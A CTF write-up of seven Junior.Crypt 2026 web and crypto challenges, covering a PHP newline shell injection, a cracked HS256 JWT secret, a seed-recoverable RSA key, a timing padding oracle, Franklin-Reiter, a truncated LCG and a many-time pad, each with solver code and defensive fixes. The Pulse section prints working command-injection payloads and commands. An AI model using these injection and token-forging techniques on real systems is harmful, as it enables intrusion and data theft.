---
来源: https://cybersecurityelite.com/ctf-writeups/junior-crypt-2026-web-crypto-writeup/
类型: html
获取日期: 2026-06-30
---

![Junior.Crypt 2026 web + crypto writeup — seven challenges solved covering newline-based shell command injection through a first-line-only validator, HS256 JWT with a wordlist-cracked butterfly secret, timestamp-seeded RSA key generation with 604800 candidates, offline Vaudenay CBC padding-oracle replay from a timing trace, Franklin-Reiter with e=3 and a known affine relation, LCG with 20-bit truncated seed, and many-time pad recovered by multiset match against a fixed template](https://cybersecurityelite.com/images/articles/junior-crypt-2026-web-crypto-writeup.png)Table of Contents

**Junior.Crypt 2026** (grodno flag prefix) shipped a web track with two well-designed misuse challenges and a crypto track built almost entirely around a single Portal / Aperture Science theme where every flag payload spells out its own vulnerability class in leetspeak: *“still alive but GLaDOS keeps rewriting messages”* is Franklin-Reiter over `e = 3`; *“this was a triumph but the seed was too small”* is a 20-bit truncated LCG; *“companion cube this is strictly a many-time pad”* is a template-driven multiset-match recovery; *“neurotoxin diagnostics leak through timing alone”* is an offline Vaudenay CBC padding-oracle attack replayed from a recorded 98,304-record timing trace. The web track’s Pulse challenge lets you inject a shell command through a validator that only checks the first line of a batch input, while Wrodle ships an HS256 game-state JWT whose secret is `butterfly` from any modern wordlist.

This writeup pairs with the [Junior.Crypt 2026 pwn + reverse writeup](https://cybersecurityelite.com/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/) on the same site (Clockwork Vault, House of Mirage, Museum of Echoes, Write The “Кодэ”). Handouts, per-challenge READMEs, and pure-stdlib Python solvers live at [Abdelkad3r/Junior.Crypt.2026-CTF](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF).

## The seven Junior.Crypt 2026 web + crypto challenges[#](#the-seven-juniorcrypt-2026-web--crypto-challenges)

| Challenge | Category | Bug class / primitive | Flag |
| --- | --- | --- | --- |
| Pulse | Web | PHP diagnostics page. `explode("\n", ..., 2)[0]` extracts only the first line for validation via `preg_match('/\A[a-z0-9.-]+\z/i', ...)`, but `shell_exec` runs the full multi-line `$targets` buffer. Newline is a POSIX shell command separator. Payload: `127.0.0.1\nid`. Flag file at `/opt/diagnostics/jobs/<uuid>/flag.txt`. | `grodno{81bd8828-50fd-48e1-80a3-6b6a2376f304}` |
| Wrodle | Web | Express Wordle clone with 50 rounds. Game state in HS256 JWT with claims `{session, current_word, lives, attempts}`. Secret `butterfly` (position 4869 in SecLists JWT wordlist). Sign token with `current_word: 51` → `/api/finish` returns coordinate list `WWL` (word/letter index). Forge per-word tokens with `attempts: 0`, use `/api/guess` as an oracle. Extract letters. | `grodno{emmagtsrow}` |
| MeowMeow? | Crypto | 767-bit RSA modulus. `meow_rsa.meow` is a Meow-token-encoded pseudocode of a SplitMix64-driven prime generator seeded from a Unix timestamp in the range 2026-06-20..2026-06-26 UTC (604800 seeds). Scan candidates using `abs(n - p_base * q_base) < 2^430` as fast filter; hit at seed `1782240431` (2026-06-23 18:47:11 UTC). Textbook RSA decryption. | `grodno{meowMeoWmEOwmeeoowMEOWWW}` |
| Neurotoxin Diagnostics | Crypto | AES-CBC ciphertext (8 blocks + IV) plus a 98,304-record timing trace `{block, pad, guess, trial, elapsed_ns}` = Vaudenay padding oracle replayed offline. Per (block, pad), min-of-3-trials argmax over 256 guesses picks the winner (~14σ outlier). Recover intermediate state `J[16-p] = winner XOR pad`; plaintext = `J XOR previous_ciphertext_block`. | `grodno{n3ur070x1n_d14gn0571c5_l34k_7hr0ugh_71m1ng_4l0n3}` |
| Still Alive | Crypto | 2047-bit RSA, `e = 3`, two ciphertexts related by known affine `m₂ = 1337·m₁ + b (mod n)` with `b` at 182 bits. Franklin-Reiter: `gcd(x³ - c₁, (1337x + b)³ - c₂)` in `Z_n[x]` collapses to `(x - m₁)`. Bonus: `m₁ < n^(1/3)`, so a direct integer cube root of `c₁` also works. | `grodno{571ll_4l1v3_bu7_g14d05_k3375_r3w5171ng_m35s4g35}` |
| Stream Calibration | Crypto | XOR with Numerical Recipes LCG (`a = 1664525`, `c = 1013904223`, `m = 2^32`) whose seed is truncated with `state = seed & 0xFFFFF`. Only 2^20 = 1,048,576 distinct keystreams. Brute-force all seeds against a `b"grodno{"` substring crib. Seed `0x5a17c`. | `grodno{7h15_w45_4_7r1umph_bu7_7h3_533d_w45_700_5m4ll}` |
| Weighted Companion Cube | Crypto | Stream cipher, same “boot-state” (keystream) across a batch of 7 records. Template: literal `[Aperture Archive]\nitem=<18>\nstatus=<12>\nsector=<12>\nmemo=<64>\n` = 153 bytes. Literal positions give `K` directly. Variable positions solved by multiset match against a 6-value catalog per field. One ambiguous byte (memo[33]) resolved via flag-alphabet constraint. | `grodno{c0mp4n10n_cub3_7h15_15_57r1c7ly_4_m4ny_71m3_p4d}` |

The pattern that ties the crypto track together is deliberately literary: every flag payload is a one-line description of the vulnerability class it dramatises. That is not decoration; it is a hint from the author about what standard textbook attack the challenge is a wrapper for. `"still alive but GLaDOS keeps rewriting messages"` names Franklin-Reiter’s exact prerequisite; `"this was a triumph but the seed was too small"` names the LCG seed-truncation bug; `"companion cube this is strictly a many-time pad"` names the many-time-pad class; `"neurotoxin diagnostics leak through timing alone"` names the timing side channel Vaudenay uses. Reading the flag on your first pop should feel like the writeup has already been written; the walkthrough below just fills in the mechanics.

## Methodology — read the metadata, then the flag, then the code[#](#methodology--read-the-metadata-then-the-flag-then-the-code)

A pattern that worked across every crypto challenge: read the metadata/README first (it usually names the mode, block size, or “note” that describes the bug in one line), then read what the *flag* is claimed to contain (the leetspeak payload will name the attack class), then read the code. `metadata.json` in Neurotoxin Diagnostics says “Only packet timing telemetry survived the diagnostic run”; that one sentence tells you the attack is Vaudenay-through-timing. `metadata.json` in Weighted Companion Cube says “Every archive in this batch was encrypted under the same boot-state”; that names the many-time-pad. Every crypto challenge in the track puts its bug into a note field or into the flag; ignoring those sources costs hours.

For the two web challenges, the discipline is different: read the UI copy carefully. Pulse’s frontend literally says *“Batch mode accepts one target per line”* and *“The first address is used for the preflight target check.”* Those two sentences describe the vulnerability. Wrodle’s HTML has a `<pre id="coordinates">` element on the final screen, which telegraphs that the flag will not be the 50 solved words but a coordinate-encoded extraction of specific letters from them.

Per-challenge walkthroughs follow.

## Web track[#](#web-track)

### 1. Pulse[#](#1-pulse)

A PHP “Pulse Ops” diagnostics console with a batch-mode ICMP probe. The input validator extracts the first line and checks it against `/\A[a-z0-9.-]+\z/i`, but the shell command concatenates the entire multi-line input. Newline is a POSIX command separator.

#### Step 1 — Fingerprint the service[#](#step-1--fingerprint-the-service)

```
$ curl -i http://<host>/
HTTP/1.1 200 OK
Server: Apache/2.4.67 (Debian)
X-Powered-By: PHP/8.3.31
```

UI copy that describes the whole bug:

```
<textarea id="targets" name="targets" maxlength="512"
          placeholder="gateway.local&#10;10.20.0.15"></textarea>
<p>The first address is used for the preflight target check.</p>
```

“Batch mode accepts one target per line” + “the first address is used for the preflight check” = only the first line is validated. The rest is data going into a shell command.

#### Step 2 — Confirm single-line metacharacters are blocked[#](#step-2--confirm-single-line-metacharacters-are-blocked)

Standard one-line injection candidates all fail:

```
127.0.0.1;id
127.0.0.1&&id
127.0.0.1|id
127.0.0.1$(id)
127.0.0.1`id`
```

Each hits an input-validation error. But newline is not in the block list, and the validator only sees the first line.

#### Step 3 — Fire the newline payload[#](#step-3--fire-the-newline-payload)

```
$ curl -sS -X POST \
    --data-urlencode $'targets=127.0.0.1\nid' \
    http://<host>/
```

Response includes:

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.100 ms
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Two commands ran: `ping -c 1 -W 1 127.0.0.1`, then `id`. POSIX shells treat `\n` as a command separator; the validator only checked the first line.

#### Step 4 — Read the source and find the flag[#](#step-4--read-the-source-and-find-the-flag)

```
127.0.0.1
sed -n "1,220p" /var/www/html/index.php
```

The vulnerable block is short:

```
$previewTarget = explode("\n", str_replace("\r", '', $targets), 2)[0];
if (!preg_match('/\A[a-z0-9.-]+\z/i', $previewTarget)) {
    $error = 'The first target contains invalid characters.';
} else {
    $command = 'timeout 4 ping -c 1 -W 1 ' . $targets . ' 2>&1';
    $output = shell_exec($command);
}
```

The comment right above it is almost a confession: `// The preview validator was never updated when batch mode was introduced.` Locate the flag:

```
127.0.0.1
find /opt -maxdepth 4 -type f 2>/dev/null
```

```
/opt/diagnostics/jobs/bae99673-152b-401b-b374-97409924840e/flag.txt
```

Read it:

```
grodno{81bd8828-50fd-48e1-80a3-6b6a2376f304}
```

Per-challenge README + solver: [web/pulse](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/web/pulse).

The bug shape is a validation/usage mismatch: `preg_match` runs on the first line, `shell_exec` runs on the full buffer. The mechanical fix is either to reject any input containing a newline, or to validate the exact bytes that get executed. The stronger fix is to skip the shell entirely (`escapeshellarg` at minimum, or `proc_open` with an explicit argv), because a character-based blocklist trying to reproduce shell parsing loses to any operator the author didn’t think of (here, `\n`).

### 2. Wrodle[#](#2-wrodle)

An Express-backed Wordle clone with a 50-round game whose state lives in an HS256 JWT the browser holds. Sign your own state → skip the game → read a coordinate-encoded flag.

#### Step 1 — Recon the API shape[#](#step-1--recon-the-api-shape)

The frontend uses:

```
apiCall('/start',  { method: 'POST' })
apiCall('/state')
apiCall('/guess',  { method: 'POST', body: JSON.stringify({ guess }) })
apiCall('/finish')
```

Deployment files are exposed as static assets (Dockerfile + nginx.conf) and confirm the split: nginx serves static frontend, `/api/*` proxies to a Node backend at `backend:3000`.

#### Step 2 — Decode the token[#](#step-2--decode-the-token)

`POST /api/start` returns a JWT:

Header:

```
{"alg":"HS256","typ":"JWT"}
```

Payload:

```
{
  "session": "c90e34fb-59b0-4a13-a3f8-6d68d2ec8f2f",
  "current_word": 1,
  "lives": 9,
  "attempts": 0,
  "iat": 1783821413
}
```

Server-trusted state in a client-held HMAC token. `alg:"none"` is rejected explicitly (`"alg \"none\" is not accepted"`), so cracking the HMAC secret is the only path.

#### Step 3 — Crack the HS256 secret[#](#step-3--crack-the-hs256-secret)

HS256 signature verification is straight HMAC-SHA256 comparison. Feed the header.payload.signature triple to any wordlist checker. `SecLists/Passwords/scraped-JWT-secrets.txt` finds it:

```
FOUND 'butterfly' after 4869
```

Position 4869 in the wordlist: a human word that any modern JWT-secret wordlist contains near the top.

#### Step 4 — Skip to the finish endpoint[#](#step-4--skip-to-the-finish-endpoint)

The server treats `current_word > total_words` as game complete. Sign a token with `current_word: 51`:

```
$ curl -H "Authorization: Bearer <forged>" http://<host>/api/finish
```

Response:

```
{
  "hint": "This doesn't look like a flag... maybe it's not letters, but directions to them.",
  "coordinates": "035 083 145 193 233 313 364 422 472 501"
}
```

Coordinate list, not a flag. Each three-digit token is `WWL` (word index + letter position).

#### Step 5 — Extract the letters via API oracle[#](#step-5--extract-the-letters-via-api-oracle)

With the secret cracked, we can forge tokens for any word index with `attempts: 0`. Use `/api/guess` as a Wordle oracle (color feedback narrows candidates per guess) to solve each of the 10 coordinate words:

| Coord | Word # | Letter # | Answer | Extracted |
| --- | --- | --- | --- | --- |
| `035` | 3 | 5 | crane | e |
| `083` | 8 | 3 | lemon | m |
| `145` | 14 | 5 | charm | m |
| `193` | 19 | 3 | beach | a |
| `233` | 23 | 3 | angel | g |
| `313` | 31 | 3 | watch | t |
| `364` | 36 | 4 | mouse | s |
| `422` | 42 | 2 | brave | r |
| `472` | 47 | 2 | house | o |
| `501` | 50 | 1 | whale | w |

Concatenated in order: `emmagtsrow`.

Wrap: `grodno{emmagtsrow}`.

Per-challenge README + solver: [web/wrodle](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/web/wrodle).

Two defensive mistakes stacked here. Client-trusted state in an HS256 JWT with a weak secret turns the token into editable client state; a low-entropy secret means the “signed” claim is only as strong as the wordlist. The mechanical fix is to use a random 256-bit secret and rotate it per deployment; the deeper fix is to keep game progress server-side and use the JWT only to identify the session (so `current_word: 51` in the JWT is meaningless because the server ignores it and reads `session_progress[session_id]` from its own database).

## Crypto track[#](#crypto-track)

### 3. MeowMeow?[#](#3-meowmeow)

RSA with a 767-bit modulus and a “meow-encoded” pseudocode file describing a SplitMix64-driven prime generator seeded from a Unix timestamp in a one-week window. 604,800 seeds → tractable exhaustive search.

#### Step 1 — Decode the meow file[#](#step-1--decode-the-meow-file)

The file `meow_rsa.meow` uses only seven distinct characters: `M`, `e`, `o`, `w`, space, `;`, newline. The unit is not letters but the count of `Meow` tokens per line. Counting tokens yields a stream like `2, 115, 10, 2, 101, 10, ...`. The pattern:

* `2` starts a character record
* middle value is an ASCII byte
* `10` marks newline

Decoded, the file is pseudocode:

```
seed = unix_time(2026-06-20..2026-06-26 UTC)
splitmix64(x):
  x = (x + 0x9E3779B97F4A7C15) mod 2^64
  z = ...
state = seed XOR 0x6A09E667F3BCC909
skip = 0x80 + ((seed >> 12) & 0xff) + (seed & 0x1f)
advance state skip times
p_words[i] = splitmix64(state) XOR rol64(seed, i + 3)
q_words[i] = bswap64(splitmix64(state) XOR 0xA5A5A5A5A5A5A5A5 XOR p_words[i]) XOR rol64(seed, 11 + i)
p = next_prime(pack6(p_words) | (1 << 383) | 1)
q = next_prime(pack6(q_words) | (1 << 383) | 1)
```

`meow_rsa.meow` is the key generator, not a key.

#### Step 2 — Optimise the state advance[#](#step-2--optimise-the-state-advance)

SplitMix64 adds `0x9E3779B97F4A7C15` at each step, so `skip` iterations = one closed-form addition:

```
state = (seed ^ 0x6A09E667F3BCC909) + skip * 0x9E3779B97F4A7C15
state &= (1 << 64) - 1
```

#### Step 3 — Fast timestamp filter[#](#step-3--fast-timestamp-filter)

Prime gaps around 384-bit numbers are tiny compared to the modulus, so for the correct seed `abs(n - p_base * q_base)` is small. For random seeds it’s enormous. A threshold of `2^430` cleanly separates the true seed:

```
for seed in range(start, end + 1):
    p_base, q_base = prime_bases(seed)
    if abs(n - p_base * q_base) < (1 << 430):
        break
```

Hit: `1782240431` (2026-06-23 18:47:11 UTC).

#### Step 4 — Recover the primes and decrypt[#](#step-4--recover-the-primes-and-decrypt)

```
p = next_prime(p_base) = p_base + 60
q = next_prime(q_base) = q_base + 176
assert p * q == n

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
```

Decodes to `grodno{meowMeoWmEOwmeeoowMEOWWW}`.

Per-challenge README + solver: [crypto/meowmeow](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/crypto/meowmeow).

The break-point is deterministic key generation from a small-entropy seed. Time-based seeds are the classical instance of this bug (the Debian OpenSSL 2006-2008 CVE-2008-0166 is the canonical real-world example, though that was PID + a much larger issue), and any modern implementation must seed from `/dev/urandom` or equivalent CSPRNG output.

### 4. Neurotoxin Diagnostics[#](#4-neurotoxin-diagnostics)

AES-CBC ciphertext (8 blocks + IV = 9 blocks × 16 bytes = 144 bytes) plus a 98,304-record timing trace. Metadata note: “Only packet timing telemetry survived the diagnostic run.” That names the attack: Vaudenay CBC padding oracle, played back offline from a recording.

#### Step 1 — Read the metadata[#](#step-1--read-the-metadata)

```
{
  "title": "Aperture Science AES: Neurotoxin Diagnostics",
  "mode": "aes-cbc",
  "block_size": 16,
  "note": "Only packet timing telemetry survived the diagnostic run."
}
```

The note is the attack description in one line.

#### Step 2 — Confirm the trace shape[#](#step-2--confirm-the-trace-shape)

```
$ python3 -c 'import json; d=json.load(open("timing_trace.json")); print(len(d), d[0])'
98304 {'block': 4, 'pad': 4, 'guess': 190, 'trial': 0, 'elapsed_ns': 1275767}
```

`8 blocks × 16 pad positions × 256 guesses × 3 trials = 98304`. Exact bookkeeping of a Vaudenay probe: for each ciphertext block and each padding position 1..16, try all 256 possible manipulated-previous-byte values, three trials each for noise averaging.

#### Step 3 — Reason through the primitive[#](#step-3--reason-through-the-primitive)

CBC decryption: `P_i = AES_dec(C_i) XOR C_{i-1}`. Let `J_i = AES_dec(C_i)` be the intermediate state (unknown to the attacker but constant per ciphertext block). The oracle checks PKCS#7 validity after XOR against a chosen `C'_{i-1}`. To recover `J_i[16-p]`:

1. Build `C'_{i-1}` with the last `p-1` bytes already forced to make `J_i[..] XOR C'_{i-1}[..] = p, p, ..., p` (from previously recovered J bytes).
2. Iterate byte `g` from 0 to 255 in position `16-p` of `C'_{i-1}`.
3. The winning `g` is the one where padding validates. `J_i[16-p] = g XOR p`.

Repeat for `p = 1..16`, then `P_i = J_i XOR C_{i-1}` using the original ciphertext.

#### Step 4 — Find the timing signal per (block, pad)[#](#step-4--find-the-timing-signal-per-block-pad)

The oracle takes longer on valid padding (further parsing / MAC checks) than invalid. For block 1, pad 1:

```
256 guesses, min-of-3-trials each:
mean ≈ 1,093,948 ns
sd   ≈    98,076 ns
max  ≈ 2,475,980 ns   (guess=27, z ≈ +14σ)
```

14σ outlier; every (block, pad) bucket has exactly one clean winner. Min-of-trials is the right aggregator: OS scheduler noise is one-sided (things get slower, not faster), so the fastest observation is the minimum-variance estimator of true execution time.

#### Step 5 — Rebuild the plaintext[#](#step-5--rebuild-the-plaintext)

```
for i in 1..8:
    J = [0] * 16
    for p in 1..16:
        g = winner(block=i, pad=p)
        J[16 - p] = g ^ p
    P_i = bytes(J[k] ^ C[i-1][k] for k in range(16))
```

Result:

```
diag=neurotoxin;
status=stable;su
bject=chell;memo
=grodno{n3ur070x
1n_d14gn0571c5_l
34k_7hr0ugh_71m1
ng_4l0n3};closin
g=still_alive\x03\x03\x03
```

Strip PKCS#7 padding (3 bytes of `\x03`), full plaintext:

```
diag=neurotoxin;status=stable;subject=chell;memo=grodno{n3ur070x1n_d14gn0571c5_l34k_7hr0ugh_71m1ng_4l0n3};closing=still_alive
```

Flag: `grodno{n3ur070x1n_d14gn0571c5_l34k_7hr0ugh_71m1ng_4l0n3}` = “neurotoxin diagnostics leak through timing alone.”

Per-challenge README + solver: [crypto/neurotoxin-diagnostics](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/crypto/neurotoxin-diagnostics).

Vaudenay’s original 2002 paper framed the attack against a Boolean valid/invalid oracle. A timing oracle is strictly weaker and strictly more common: real deployments never say “invalid padding,” but the timing gap is often present. Lucky Thirteen (Al-Fardan & Paterson 2013) demonstrated the attack against constant-time-looking TLS 1.x MAC verification. This challenge dramatises it with a 2.4× timing gap; real targets need thousands of trials and rank statistics (Mann-Whitney) instead of three trials and min-of-3. The mitigation is either AEAD (AES-GCM, ChaCha20-Poly1305) or Encrypt-then-MAC (RFC 7366); anywhere CBC still ships without EtM should be audited under the assumption padding-oracle applies.

### 5. Still Alive[#](#5-still-alive)

Textbook RSA with `e = 3`, two ciphertexts related by a known affine `m₂ = 1337·m₁ + b (mod n)`. The exact setting for Franklin-Reiter.

#### Step 1 — Read the givens[#](#step-1--read-the-givens)

```
Public-Key: (2047 bit)
Exponent: 3
c1 = 1510178335... (2044 bits)
c2 = 3609295645... (2045 bits)
a  = 1337
b  = 5577100914...  (182 bits)
```

Three flags for Franklin-Reiter:

1. `e = 3` with a 2047-bit modulus.
2. Two ciphertexts of related plaintexts.
3. `a` and `b` shipped explicitly = challenge author is declaring the affine relation.

#### Step 2 — Set up the polynomial GCD[#](#step-2--set-up-the-polynomial-gcd)

Both `m₁` and `f(m₁) = a·m₁ + b` are roots of their respective polynomials mod `n`:

```
g₁(x) = x³ − c₁                            (mod n)
g₂(x) = (a·x + b)³ − c₂                    (mod n)
```

`(x − m₁)` divides `gcd(g₁, g₂)` in `Z_n[x]`. When `e · deg(f) · (e · deg(f) + 1)/2 < log₂(n)`, i.e. `3 · 1 · 4/2 = 6 < 2047`, the gcd collapses to a linear polynomial and `m₁` is its constant term (up to leading-coefficient inversion).

Expanded `g₂`:

```
g₂(x) = a³·x³ + 3·a²·b·x² + 3·a·b²·x + b³ − c₂
```

#### Step 3 — Run Euclid mod n[#](#step-3--run-euclid-mod-n)

Euclidean algorithm on polynomials over `Z_n[x]`. At each step, invert the leading coefficient of the remainder mod `n` and normalise. If any inversion raises (i.e. the coefficient shares a factor with `n`), that factorises `n` and hands us the private key: a strictly better outcome but not one that occurs on this instance.

Every inversion succeeds; the gcd finishes as `[k, 1]` = `x + k`. Recover:

```
m₁ = (-k * pow(1, -1, n)) % n
```

Convert to bytes: `grodno{571ll_4l1v3_bu7_g14d05_k3375_r3w5171ng_m35s4g35}` = “still alive but GLaDOS keeps rewriting messages.”

#### Step 4 — Bonus: cube root also works[#](#step-4--bonus-cube-root-also-works)

With `e = 3` and unpadded plaintext, if `m^3 < n` (i.e. `m < n^(1/3)`), the ciphertext is literally the integer cube. Here `n^(1/3) ≈ 682` bits; `m` is about 438 bits (54 ASCII chars); `438 < 682`. So `icbrt(c1)` yields `m₁` directly without any of the polynomial work:

```
def icbrt(n):
    x = 1 << ((n.bit_length() + 2) // 3 + 1)
    while True:
        y = (2*x + n // (x*x)) // 3
        if y >= x: return x
        x = y
```

This is a secondary attack surface; either path works because the plaintext is unpadded. OAEP / PKCS#1 v2 would break both.

Per-challenge README + solver: [crypto/still-alive](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/crypto/still-alive).

The core lesson: textbook RSA + `e = 3` + any linear relation between plaintexts + no padding = Franklin-Reiter in three lines. Every real RSA deployment uses OAEP (or RSASSA-PSS for signatures) precisely because low-e + affine offsets + short plaintexts are all attackable individually.

### 6. Stream Calibration[#](#6-stream-calibration)

XOR with a Numerical Recipes LCG keystream whose seed is truncated to 20 bits before it reaches the internal state. 2^20 = 1,048,576 candidate seeds is fast enough to exhaust.

#### Step 1 — Read the encoder[#](#step-1--read-the-encoder)

```
MOD = 1 << 32
A = 1664525
C = 1013904223

def keystream(seed, length):
    state = seed & 0xFFFFF          # ← 20-bit truncation
    out = bytearray()
    for _ in range(length):
        state = (A * state + C) % MOD
        out.append((state >> 24) & 0xFF)
    return bytes(out)

def encrypt(message, facility_seed):
    return xor_bytes(message, keystream(facility_seed, len(message)))
```

Three tells: `1664525 / 1013904223 / 2^32` are Numerical Recipes textbook LCG parameters; output is the high byte of state (a sensible choice, since power-of-two-modulus LCGs have bit-0 period 2, bit-1 period 4, etc.); `seed & 0xFFFFF` masks the seed to 20 bits before it reaches the state. Whatever the caller passes, only 20 bits survive.

#### Step 2 — Estimate cost[#](#step-2--estimate-cost)

124 bytes of ciphertext × 2^20 seeds × one XOR-check per byte = ~130M byte-ops. Straight-line Python finishes in a few seconds.

#### Step 3 — Brute-force with a substring crib[#](#step-3--brute-force-with-a-substring-crib)

```
ct = bytes.fromhex(open("ciphertext.txt").read().strip())
for seed in range(1 << 20):
    pt = bytes(a ^ b for a, b in zip(ct, keystream(seed, len(ct))))
    if b"grodno{" in pt:
        print(hex(seed), pt.decode())
        break
```

Hit at `0x5a17c = 369020`. Plaintext:

```
[Aperture Science Internal]
classification=stable
speaker=GLaDOS
memo=grodno{7h15_w45_4_7r1umph_bu7_7h3_533d_w45_700_5m4ll}
```

Flag payload = “this was a triumph but the seed was too small”, which is the first line of *Still Alive* recycled as the vulnerability description.

Per-challenge README + solver: [crypto/stream-calibration](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/crypto/stream-calibration).

If the seed had used all 32 (or 64) bits, brute-forcing over 2^32 would still be tractable in principle at CPU speed, but the real takedown for LCG keystreams is that a few consecutive keystream bytes leak enough linear info to invert the next state and predict the rest. For a fully-known plaintext prefix of ~5 known high bytes, you can solve for the internal state directly. Overkill here, since 20-bit search wins in one script.

### 7. Weighted Companion Cube[#](#7-weighted-companion-cube)

Stream cipher with the same keystream (“boot-state”) reused across a batch of records. A fixed template, 4 variable fields with 6 catalog values each, 6 known ciphertexts + 1 secret. The many-time-pad recovery becomes a per-byte multiset-match.

#### Step 1 — Read metadata + template[#](#step-1--read-metadata--template)

```
{
  "mode": "aperture-companion-stream-v2",
  "block_size": 16,
  "format": [
    "[Aperture Archive]",
    "item=18", "status=12", "sector=12", "memo=64"
  ],
  "note": "Every archive in this batch was encrypted under the same boot-state."
}
```

“Stream” + “same boot-state” = many-time pad. Template = 19 (prefix + `\n`) + 24 (`item=<18>\n`) + 20 + 20 + 69 = 152 body + trailing `\n` = 153 bytes total. Every ciphertext in the batch is exactly 153 bytes. Confirmed.

#### Step 2 — Recover K at literal positions directly[#](#step-2--recover-k-at-literal-positions-directly)

Fixed positions across every ciphertext give K trivially:

```
0..18:  "[Aperture Archive]\n"
19..23: "item="
42:     "\n"
43..49: "status="
62:     "\n"
63..69: "sector="
82:     "\n"
83..87: "memo="
152:    "\n"
```

~50 bytes of K straight from `K[pos] = C_i[pos] XOR literal[pos]`. Verify by decrypting other known records at the same positions and checking they match the expected literal.

#### Step 3 — Multiset match for variable-field positions[#](#step-3--multiset-match-for-variable-field-positions)

Each variable field has 6 catalog values; the 6 known records permute them (assumed bijection). At any byte position within a variable field, the multiset `{C_i[pos] XOR K[pos] : i in 0..5}` must equal the multiset `{catalog[field][j][pos] : j in 0..5}`, *regardless of which record uses which catalog value*.

For each such position, brute-force `K ∈ 0..255`:

```
target = sorted(catalog[field][j][pos] for j in 0..5)
for K in range(256):
    got = sorted((C[i][pos] ^ K) & 0xFF for i in range(6))
    if got == target:
        keystream[pos] = K
        break
```

153 positions × 256-way loop = trivially fast.

#### Step 4 — Resolve the ambiguous byte[#](#step-4--resolve-the-ambiguous-byte)

At exactly one position (memo[33], absolute position 121), the multiset test yields two candidates: `K = 38` and `K = 42`. The reason: at that offset the catalog byte multiset is `{m, n, e, i, b, a}` = `{0x6d, 0x6e, 0x65, 0x69, 0x62, 0x61}`, which is closed under XOR-with-12 (`'a' XOR 0x0c = 'm'`, etc.). Both K values permute the multiset to itself.

Two ways to break the tie:

* Language plausibility: `K = 38` gives `..._57r=c7ly_4_...`; `K = 42` gives `..._57r1c7ly_4_...` (leetspeak for “strictly”). The second is real.
* Flag alphabet: the flag body only uses `[A-Za-z0-9_{}]`. `'='` is out; `'1'` is in.

The solver uses the alphabet test: automated, non-linguistic, would still work if the memo used different leet substitutions.

#### Step 5 — Decrypt[#](#step-5--decrypt)

```
[Aperture Archive]
item=cake voucher
status=issued
sector=omega-01
memo=grodno{c0mp4n10n_cub3_7h15_15_57r1c7ly_4_m4ny_71m3_p4d}
```

Flag payload = “companion cube this is strictly a many-time pad”: the attack class named in leetspeak.

Per-challenge README + solver: [crypto/weighted-companion-cube](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF/tree/main/crypto/weighted-companion-cube).

The multiset-match trick is a per-position frequency attack. It relies on the 6 known records using a permutation of the 6 catalog values, and on no two `K` values producing the same multiset image. The first assumption held here; the second failed at exactly one position due to the XOR-symmetric catalog. Domain constraints (flag alphabet, leetspeak plausibility) resolve the ambiguity. The real fix in a production system is a per-record nonce in the keystream derivation (CTR mode’s `IV || counter` construction): same key, different nonce per record, no many-time-pad.

## Cross-cutting defender notes[#](#cross-cutting-defender-notes)

Six patterns recur across the Junior.Crypt 2026 web + crypto tracks and translate directly into review heuristics.

**Validate the exact bytes you execute.** Pulse’s regex checks the first line of `$targets` and `shell_exec` runs the full multi-line buffer. Any validator whose input differs from what the sink consumes is a validation/usage mismatch, and mismatches are a general anti-pattern well beyond newline injection: URL-parser-vs-URL-fetcher (SSRF via `http://evil@internal`), path-normaliser-vs-file-opener (`..` traversal), JSON-parser-vs-Python-`eval` (round-trip decode differences). Match the validation to the sink byte-for-byte, or use a structured API that removes the ambiguity.

**Client-held state signed with a weak key is client-controlled state.** Wrodle’s HS256 JWT is signed with `butterfly`, a wordlist secret. Any HMAC-signed client state whose secret is human-word-shaped (or unrotated over the app’s lifetime) becomes forgeable in minutes with off-the-shelf wordlist tools. The mechanical fix is a random 256-bit secret per deployment; the deeper fix is to store authoritative state server-side and use the token only for session identification. Everything in the JWT payload the client can see, so putting `current_word: 51` there and expecting the server to trust it is a category error.

**Deterministic key generation from small-entropy seeds is instantly reversible.** MeowMeow’s RSA primes come from a Unix timestamp in a one-week window (604,800 seeds); Stream Calibration’s LCG keystream comes from a 20-bit-truncated seed (1,048,576). Both are trivially exhaustible. Real key generation must draw from a CSPRNG (`/dev/urandom`, `getrandom(2)`, `RAND_bytes`, `secrets.token_bytes`) with no user-facing seed input. Any implementation that exposes or narrows the seed space is a design failure; this class includes the 2008 Debian OpenSSL CVE, the FreeBSD 4.x random(3) predictability, and every “we seed with `time(NULL)`” incident.

**CBC + padding + any observable side channel = padding oracle.** Neurotoxin Diagnostics dramatises the classical Vaudenay attack via a timing trace, but the real-world analogues (Lucky Thirteen, POODLE, TLS 1.0 record MAC) all use the same primitive. Modern deployments should use AEAD (AES-GCM, ChaCha20-Poly1305) or at minimum Encrypt-then-MAC (RFC 7366). If CBC without EtM ships anywhere (legacy protocol handshakes, custom RPC layers, filesystem crypto with post-processing), treat it as vulnerable to padding-oracle attacks until proven otherwise.

**Textbook RSA is textbook-breakable.** Still Alive combines `e = 3` + affine-related plaintexts + no padding = Franklin-Reiter in three lines. Alternatively, `m < n^(1/e)` + no padding = direct integer eth-root. Every real RSA deployment uses OAEP (encryption) or RSASSA-PSS (signatures) because small exponents plus unpadded messages plus any structural relation between plaintexts collapse the security instantly. The rule: never invoke `pow(m, e, n)` on unpadded user data.

**Same nonce = many-time pad, no matter the cipher name.** Weighted Companion Cube advertises `aperture-companion-stream-v2`, but the fatal detail is in the metadata note: “Every archive in this batch was encrypted under the same boot-state.” Any stream cipher (RC4, CTR-mode AES, ChaCha20) reused with the same nonce/keystream across multiple messages is a many-time-pad, and modern MTP recovery reduces to multiset-match against known structure. The unbreakable mode requires (a) a fresh random nonce per message, (b) a MAC to prevent silent injection, (c) authenticated key confirmation. AEAD does all three; keystream-and-XOR alone does none of them.

